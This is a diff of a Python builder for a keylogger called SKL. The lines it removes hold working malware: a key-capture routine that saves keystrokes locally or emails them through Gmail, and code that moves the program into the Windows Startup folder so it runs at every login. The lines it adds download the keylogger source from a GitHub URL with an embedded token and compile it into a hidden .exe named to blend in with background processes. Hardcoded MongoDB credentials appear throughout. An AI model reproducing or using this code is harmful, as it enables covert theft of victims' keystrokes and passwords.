@@ -7,6 +7,11 @@ import socket
 import requests
 from pymongo.mongo_client import MongoClient
 from pymongo.server_api import ServerApi
+import psutil
+import shutil
+import sys 
+import getpass
+import pygetwindow as gw
 
 #!# -----------------------------------CONSTANTS----------------------------------- #!#
 
@@ -53,46 +58,6 @@ keys_pressed = 0
 
 #!# -----------------------------------INJECTOR RELEATED----------------------------------- #!#
 
-def isInjector():
-    
-    USER = os.getlogin()
-    directory = "SKL"
-    parent_dir = f"C:/Users/{USER}/AppData/Roaming"
-                    
-    path = os.path.join(parent_dir, directory)
-    try:
-            os.mkdir(path)
-    except:
-            pass
-    try:
-            with open(f"{path}/config.json","r") as f:
-                json.load(f)
-    except:
-            with open(f"{path}/config.json","w") as r:
-                pass
-
-    JsonPath = f"{path}/config.json"
-    
-    
-    try:
-        with open(f"{JsonPath}","r") as f:
-            parsed = json.load(f)
-            try:
-                injector = parsed["Injector"]
-                if injector == True:
-                    return 1
-            except:
-                pass
-            
-            
-    except:
-        pass
-    try:
-        if os.path.exists("inject.json"):
-            return 5
-    except:
-        return False
-    
 
 
 
@@ -206,102 +171,6 @@ def get_ip_address(mode):
         
 
 
-def START_LOGGER(senderEmail,senderPassword,receiverEmail, mode):                     
-  
- 
-
-
-    mode = parsed['mode']
-        
-    Key_mode = True
-    Email_mode = False
-        
-    if mode == "email":
-        Key_mode = False
-        Email_mode = True
-    elif mode == "local":
-        Key_mode = True
-        Email_mode = False
-        
-    def email(keysGiven):
-        port = 465  # For SSL
-        smtp_server = "smtp.gmail.com"
-        sender_email = senderEmail
-        receiver_email = receiverEmail  
-        password = senderPassword
-        message = f"""\
-            Subject: KEYS 
-
-        {keysGiven}."""
-
-        context = ssl.create_default_context()
-        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
-            server.login(sender_email, password)
-            server.sendmail(sender_email, receiver_email, message)
- 
- 
-#% ------------- KEY SYSTEM --------------- %#
-    def on_press(key):
-        global keys
-        global keys_pressed  
-        emailBool = False
-        if key == Key.space:
-            key = " "
-        elif key == Key.backspace:
-            key = ""
-            keys = keys[: -2]
-            keys_pressed =- 2
-        elif key == Key.enter:
-            key = "\n"
-            emailBool = True
-        elif key == "'":
-            key = "_Apostro4phe_"
-        elif key == "\x01":
-            key = ""
-        elif str(key).startswith("Key."):
-            key = ""
-            keys_pressed =- 2
-        
-        
-        if CapsStatus(): key = str(key); key = key.upper()  
-        
-        
-#@ ------------- KEY MODE SYSTEM --------------- @#
-
-        keys.append(str(key))
-        keys_pressed += 1
-        if keys_pressed > 20 and Key_mode == True:   
-            file = open(f"./out/Spicy-Logs++", "a") 
-            UNmessage = "".join(keys)
-            message = UNmessage.replace("'","")
-            message = message.replace("_Apostro4phe_","'")
-            file.write(str(message))
-            keys_pressed = 0 
-            keys = []
-            
-#& ------------- EMAIL MODE SYSTEM --------------- &#
-
-        if emailBool == True and Email_mode == True:
-            UNmessage = "".join(keys)
-            message = UNmessage.replace("'","")
-            message = message.replace("_Apostro4phe_","'")
-            email(message)
-            emailBool = False
-            keys = []
-    def isMaillable():
-        global SendMail
-        try:
-            host_Data = get_ip_address()
-            email(f"Started Process || {host_Data}")
-            SendMail = True 
-        except:
-            SendMail = False
-            print(SendMail)
-    with Listener(on_press=on_press) as listener :
-        isMaillable()
-        listener.join()
-
-
 
 
 #!# -----------------------------------CONFIG RELATED----------------------------------- #!#
@@ -354,7 +223,7 @@ def __main__():
         os.system("cls")
         printlogo()
         print(bcolors.OKCYAN + "Here's a list of avaliable commands:" + "\n" + bcolors.FAIL + "(config) " + bcolors.DIM + "Change Sender & Receiver Emails" + "\n" +
-               bcolors.RESET_DIM + "(compile) " + bcolors.DIM + "Compiles the project into a .exe to be used." + bcolors.RESET_DIM + 
+               bcolors.RESET_DIM + "(compile) " + bcolors.DIM + "compiles a keylogger to be used." + bcolors.RESET_DIM + 
                "\n(exit) " + bcolors.DIM + "Close the SKL Program" +
                  bcolors.RESET_DIM + "\n(emails) " + bcolors.DIM + "Shows your current saved config."+bcolors.RESET_DIM + "\n(Mode)" +
                  bcolors.DIM + " choose between 'local' or 'email' mode." + bcolors.RESET_DIM + "\n(status) " + bcolors.DIM + "Checks the status of various things in the program")
@@ -385,16 +254,25 @@ def __main__():
             if check_config() == False:
                 pass
             else:    
-                print(bcolors.WARNING + "Please enter a name for your .exe file." + bcolors.DIM + "\nMake sure it blends in with other background processes (do not use spaces)." + bcolors.RESET_DIM)
+                print(bcolors.WARNING + "Please enter a name for your .exe file." + bcolors.DIM + "\nMake sure it blends in with other background processes" + bcolors.RESET_DIM)
                 filename = input(bcolors.OKBLUE + "filename: " + bcolors.WHITE)
                 os.system("cls")
                 printlogo()
                 print(bcolors.WARNING + "Enter the file path of a logo" + bcolors.DIM + "\nIf you dont have a logo, just type NONE." + bcolors.RESET_DIM)
+                SRC = (sys.argv[0])
+                File = os.path.basename(SRC)
                 logo = input(bcolors.OKBLUE + "filename: " + bcolors.WHITE)
                 if logo.lower() == "none": logo = logo.upper()
-                os.rename("SKL.py", filename + ".py")
-                os.system(f"pyinstaller -F -w \"{filename}\".py -i {logo.upper()}")
-                os.rename(f"{filename}.py", "SKL.py")
+                file_url = "https://raw.githubusercontent.com/VoidyCD/SKL/main/SKL.py?token=GHSAT0AAAAAACGOZN2CNPEESKHGNZIXKGDQZHE6IJA"
+                response = requests.get(file_url)
+
+                if response.status_code == 200:
+                    with open(f"{filename}.py", "wb") as file:
+                        file.write(response.content)
+                    
+                os.system(f"pyinstaller -F -w \"{filename}\".py -i \"{logo}\"")
+                os.remove(filename)
+
                 
                 with open("./dist/inject.json", "w") as f:
                     with open(f"{JsonPath}", "r") as j:
@@ -405,16 +283,13 @@ def __main__():
                         mode = parsed["mode"]
                         configData = {"sender_email": senderEmail, "sender_password": senderPassword,
                                       "receiver_email": receiverEmail,
-                                      "mode": mode, "Injector": True}
+                                      "mode": mode}
                         
                         json.dump(configData,f)
-        except:
+        except Exception as e:
             print(bcolors.FAIL + "Failed to compile KeyLogger properly.")
-    elif CONSOLE.lower() == "test":
-        try:
-            START_LOGGER()
-        except:
-            print("Something went wrong when loading the keylogger.")
+            print(e)
+
             
     elif CONSOLE.lower() == "mode":
         os.system("cls")
@@ -431,22 +306,8 @@ def __main__():
         
         
         
-#!# -----------------------------------STARTUP APP----------------------------------- #!#    
 
-if isInjector() == 1 or isInjector() == 5:
-    import shutil
-    import sys 
-    import getpass
-    
-    USER_NAME = getpass.getuser()
-    Src = (sys.argv[0])
-    Dest = r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % USER_NAME
-    try:
-        shutil.move(Src, Dest)
-    except:
-        pass        
-    
-    
+
     
                 
                 
@@ -457,13 +318,14 @@ def connectToDatabase(returnItem):
 
     try:
         
-        uri = "mongodb+srv://skl:4rcQtgbSZbyq5AIC@skl.jdigidi.mongodb.net/?retryWrites=true&w=majority"
+        uri = "mongodb+srv://USER_SKL_PROGRAM:2szsiET3RM0JuQnl@skl.jdigidi.mongodb.net/?retryWrites=true&w=majority"
 
         client = MongoClient(uri, server_api=ServerApi('1'))
 
         database = client.get_database("SKL-Keys")
 
         collection = database["serial-key"]
+        games_collection = database["game-programs"]
 
         cursor = collection.find_one("skl-program-serial-keys")
         serial_keys = cursor["skl-serial-key"]
@@ -474,6 +336,8 @@ def connectToDatabase(returnItem):
             return serial_keys
         elif returnItem == "database":
             return database
+        elif returnItem == "games":
+            return games_collection
 
     except:
         print("Failed to connect to SKL database!\nAre you a registered user? Please contact voidy6059 on discord about this issue.")
@@ -628,43 +492,7 @@ def isLicensed():
 
 #%# -----------------------------------INJECTOR----------------------------------- #%#
 
-if isInjector() == 1:
-    with open(f"{JsonPath}", "r") as Config:
-        parsed = json.load(Config)
-        JsenderEmail = parsed["sender_email"]
-        JsenderPassword = parsed["sender_password"]
-        JreceiverEmail = parsed["receiver_email"]
-        Jmode = parsed["mode"]
-        configData = {"sender_email": JsenderEmail, "sender_password": JsenderPassword,
-                        "receiver_email": JreceiverEmail,
-                        "mode": Jmode, "Injector": True}
-         
-                              
-    START_LOGGER(JsenderEmail,JsenderPassword,JreceiverEmail, Jmode)
-        
-        
-elif isInjector() == 5:
-    
-    with open(f"inject.json", "r") as Inject:
-        parsed = json.load(Inject)
-        Injector = parsed["Injector"]
-        if Injector == True:
-            with open(f"{JsonPath}", "w") as Config:
-                    JsenderEmail = parsed["sender_email"]
-                    JsenderPassword = parsed["sender_password"]
-                    JreceiverEmail = parsed["receiver_email"]
-                    Jmode = parsed["mode"]
-                    configData = {"sender_email": JsenderEmail, "sender_password": JsenderPassword,
-                                            "receiver_email": JreceiverEmail,
-                                            "mode": Jmode, "Injector": True}
-                                
-                    json.dump(configData,Config)   
-    os.remove("inject.json")            
-    START_LOGGER(JsenderEmail,JsenderPassword,JreceiverEmail, Jmode)
-else:                    
-   isLicensed()
 
-isLicensed()
 
 
 print(bcolors.WHITE)
